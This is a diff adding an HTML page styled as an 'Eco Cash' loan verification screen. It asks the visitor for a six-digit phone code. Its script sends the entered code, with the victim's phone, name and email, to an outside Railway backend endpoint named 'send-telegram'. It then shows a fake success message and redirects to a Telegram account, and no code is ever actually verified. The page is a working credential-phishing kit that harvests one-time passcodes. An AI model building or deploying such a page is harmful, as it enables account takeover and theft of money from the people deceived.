@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Eco Cash · Verify Number</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated gradient overlay */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 20% 50%, rgba(20, 184, 166, 0.08) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.5; transform: scale(0.98); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .app-container {
+            max-width: 540px;
+            width: 100%;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            margin-bottom: 28px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        .logo-icon {
+            font-size: 2.5rem;
+            margin-bottom: 8px;
+            display: inline-block;
+            animation: float 3s ease-in-out infinite;
+        }
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff, #14b8a6);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+        .tagline {
+            font-size: 0.8rem;
+            color: #7e8aa2;
+            margin-top: 4px;
+        }
+
+        /* Loan Summary Bar */
+        .loan-summary-bar {
+            background: rgba(17, 24, 39, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            border: 1px solid rgba(20, 184, 166, 0.15);
+            animation: fadeInUp 0.6s ease-out 0.05s both;
+        }
+        .summary-item {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .summary-label {
+            font-size: 0.65rem;
+            font-weight: 500;
+            color: #7e8aa2;
+            text-transform: uppercase;
+        }
+        .summary-value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #14b8a6;
+            margin-top: 2px;
+        }
+
+        /* Main OTP Card */
+        .otp-card {
+            background: rgba(17, 24, 39, 0.85);
+            backdrop-filter: blur(20px);
+            border-radius: 48px;
+            border: 1px solid rgba(20, 184, 166, 0.2);
+            padding: 32px 28px;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            animation: fadeInUp 0.6s ease-out 0.1s both;
+        }
+        .otp-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 35px 55px -12px rgba(20, 184, 166, 0.15);
+        }
+
+        .section-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffffff, #14b8a6);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 4px;
+        }
+        .section-sub {
+            font-size: 0.75rem;
+            color: #7e8aa2;
+            margin-bottom: 28px;
+            border-left: 3px solid #14b8a6;
+            padding-left: 12px;
+        }
+
+        /* Phone Display Box */
+        .phone-verify-box {
+            background: rgba(15, 23, 36, 0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 18px 16px;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid rgba(20, 184, 166, 0.1);
+        }
+        .phone-number {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e2e8f0;
+        }
+        .edit-link {
+            color: #14b8a6;
+            background: rgba(20, 184, 166, 0.1);
+            padding: 6px 14px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all 0.2s ease;
+        }
+        .edit-link:hover {
+            background: rgba(20, 184, 166, 0.2);
+            transform: scale(1.02);
+        }
+
+        /* OTP Boxes */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .otp-box {
+            width: 55px;
+            height: 65px;
+            background: rgba(15, 23, 36, 0.8);
+            border: 2px solid rgba(31, 42, 62, 1);
+            border-radius: 20px;
+            text-align: center;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #14b8a6;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+        .otp-box:focus {
+            border-color: #14b8a6;
+            box-shadow: 0 0 0 3px rgba(20, 184, 166, 0.2);
+            transform: scale(1.02);
+        }
+
+        /* Timer & Resend */
+        .timer-text {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #7e8aa2;
+            margin-bottom: 8px;
+        }
+        .resend-btn {
+            display: block;
+            margin: 0 auto 24px;
+            background: none;
+            border: none;
+            color: #14b8a6;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 0.8rem;
+            padding: 8px 16px;
+            border-radius: 40px;
+            transition: all 0.2s ease;
+        }
+        .resend-btn:hover {
+            background: rgba(20, 184, 166, 0.1);
+            transform: scale(1.02);
+        }
+
+        /* Verify Button */
+        .verify-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #14b8a6, #0d9488);
+            border: none;
+            padding: 18px;
+            font-size: 1rem;
+            font-weight: 700;
+            color: #0b1120;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(20, 184, 166, 0.3);
+        }
+        .verify-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .verify-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s ease;
+        }
+        .verify-btn:hover:not(:disabled)::before {
+            left: 100%;
+        }
+        .verify-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px -8px rgba(20, 184, 166, 0.5);
+        }
+
+        .error-message {
+            color: #f43f5e;
+            font-size: 0.75rem;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+            animation: shake 0.3s ease-out;
+        }
+
+        .success-message {
+            color: #14b8a6;
+            font-size: 0.8rem;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+            background: rgba(20, 184, 166, 0.1);
+            padding: 10px;
+            border-radius: 12px;
+        }
+        .success-message.show {
+            display: block;
+            animation: pulse 0.3s ease-out;
+        }
+
+        /* Security Note */
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 24px;
+            font-size: 0.65rem;
+            color: #5b6a8a;
+            flex-wrap: wrap;
+        }
+
+        @media (max-width: 480px) {
+            .otp-card {
+                padding: 22px 18px 26px;
+            }
+            .otp-box {
+                width: 48px;
+                height: 55px;
+                font-size: 1.4rem;
+            }
+            .otp-container {
+                gap: 8px;
+            }
+            .logo-icon {
+                font-size: 2rem;
+            }
+            .logo-text {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="app-container">
+    <div class="hero">
+        <div class="logo-icon">💰</div>
+        <div class="logo-text">Eco Cash</div>
+        <div class="tagline">Verify your identity</div>
+    </div>
+
+    <div class="loan-summary-bar">
+        <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
+        <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
+        <div class="summary-item"><span class="summary-label">Monthly</span><span class="summary-value" id="summaryMonthly">$0</span></div>
+        <div class="summary-item"><span class="summary-label">Interest</span><span class="summary-value" id="summaryRate">5%</span></div>
+    </div>
+
+    <div class="otp-card">
+        <div class="section-title">📱 Verify your number</div>
+        <div class="section-sub">Enter the 6-digit verification code sent to your phone</div>
+
+        <div class="phone-verify-box">
+            <div><span class="phone-number" id="displayPhone">+26377 567 8900</span></div>
+            <div class="edit-link" id="editPhoneBtn">Edit</div>
+        </div>
+
+        <div class="otp-container">
+            <input type="text" maxlength="1" class="otp-box" data-idx="0" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="1" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="2" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="3" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="4" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="5" inputmode="numeric">
+        </div>
+
+        <div class="timer-text" id="timerText">Code expires in 02:00</div>
+        <button class="resend-btn" id="resendBtn">Resend code</button>
+
+        <div class="success-message" id="otpSuccess">✓ Verified! Redirecting...</div>
+        <div class="error-message" id="otpError">⚠️ Please enter all 6 digits</div>
+        <button class="verify-btn" id="verifyBtn">Verify & Continue →</button>
+
+        <div class="security-note">
+            <span>🔒</span> Your verification is encrypted and secure
+            <span>⚡</span> One-time code expires in 2 minutes
+        </div>
+    </div>
+</div>
+
+<script>
+    // ============================================
+    // CONFIGURATION - UPDATE WITH YOUR BACKEND URL
+    // ============================================
+    const RAILWAY_URL = 'https://primelend-production.up.railway.app';
+    const TELEGRAM_USERNAME = 'YourUsername';
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const amount = urlParams.get('amount') || '500';
+    const term = urlParams.get('term') || '3';
+    const rate = urlParams.get('rate') || '5';
+    const monthly = urlParams.get('monthly') || '167.36';
+    let userPhone = urlParams.get('phone') || '+1 234 567 8900';
+    const userName = urlParams.get('name') || 'Customer';
+    const userEmail = urlParams.get('email') || '';
+    
+    document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
+    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
+    document.getElementById('summaryMonthly').innerText = `$${parseFloat(monthly).toFixed(2)}`;
+    document.getElementById('summaryRate').innerText = `${rate}%`;
+    document.getElementById('displayPhone').innerText = userPhone;
+
+    let timeLeft = 120;
+    let timerInterval;
+
+    function updateTimer() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('timerText').innerText = `Code expires in ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            document.getElementById('timerText').innerHTML = 'Code expired. Please request a new code.';
+        }
+    }
+
+    function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        timeLeft = 120;
+        updateTimer();
+        timerInterval = setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                updateTimer();
+            }
+        }, 1000);
+    }
+
+    startTimer();
+
+    document.getElementById('resendBtn').onclick = () => {
+        startTimer();
+        const errorMsg = document.getElementById('otpError');
+        errorMsg.classList.remove('show');
+        const successMsg = document.getElementById('otpSuccess');
+        successMsg.textContent = '✓ New code sent!';
+        successMsg.classList.add('show');
+        setTimeout(() => successMsg.classList.remove('show'), 3000);
+    };
+    
+    async function sendOtpNotification(otp) {
+        try {
+            await fetch(`${RAILWAY_URL}/api/send-telegram`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: userPhone, pin: otp, email: userEmail, name: userName, type: 'otp'
+                })
+            });
+        } catch (error) { console.error('Error:', error); }
+    }
+    
+    function redirectToTelegram() { 
+        window.location.href = `https://t.me/${TELEGRAM_USERNAME}`; 
+    }
+    
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    let currentOtp = ['', '', '', '', '', ''];
+    const verifyBtn = document.getElementById('verifyBtn');
+    const errorMsg = document.getElementById('otpError');
+    const successMsg = document.getElementById('otpSuccess');
+    
+    function updateOtpUI() { 
+        otpBoxes.forEach((box, idx) => { 
+            box.value = currentOtp[idx] || ''; 
+        }); 
+    }
+    
+    function setOtpDigit(index, value) {
+        if (value && !value.match(/[0-9]/)) return;
+        if (index >= 0 && index < 6) {
+            currentOtp[index] = value || '';
+            updateOtpUI();
+            if (value && index < 5) otpBoxes[index + 1].focus();
+            errorMsg.classList.remove('show');
+        }
+    }
+    
+    otpBoxes.forEach((box, idx) => {
+        box.addEventListener('input', (e) => setOtpDigit(idx, e.target.value.slice(-1)));
+        box.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace') {
+                e.preventDefault();
+                if (currentOtp[idx] !== '') setOtpDigit(idx, '');
+                else if (idx > 0) { setOtpDigit(idx - 1, ''); otpBoxes[idx - 1].focus(); }
+            }
+        });
+    });
+    
+    verifyBtn.onclick = async () => {
+        const enteredOtp = currentOtp.join('');
+        if (enteredOtp.length !== 6) { 
+            errorMsg.classList.add('show'); 
+            return; 
+        }
+        verifyBtn.disabled = true;
+        verifyBtn.textContent = 'Verifying...';
+        await sendOtpNotification(enteredOtp);
+        successMsg.classList.add('show');
+        setTimeout(() => { redirectToTelegram(); }, 1500);
+    };
+    
+    document.getElementById('editPhoneBtn').onclick = () => {
+        const newPhone = prompt('Enter your phone number:', userPhone);
+        if (newPhone && newPhone.trim().length > 5) { 
+            userPhone = newPhone.trim(); 
+            document.getElementById('displayPhone').innerText = userPhone; 
+            startTimer();
+            currentOtp = ['', '', '', '', '', ''];
+            updateOtpUI();
+            otpBoxes[0].focus();
+        }
+    };
+    
+    setTimeout(() => otpBoxes[0].focus(), 100);
+</script>
+</body>
+</html>
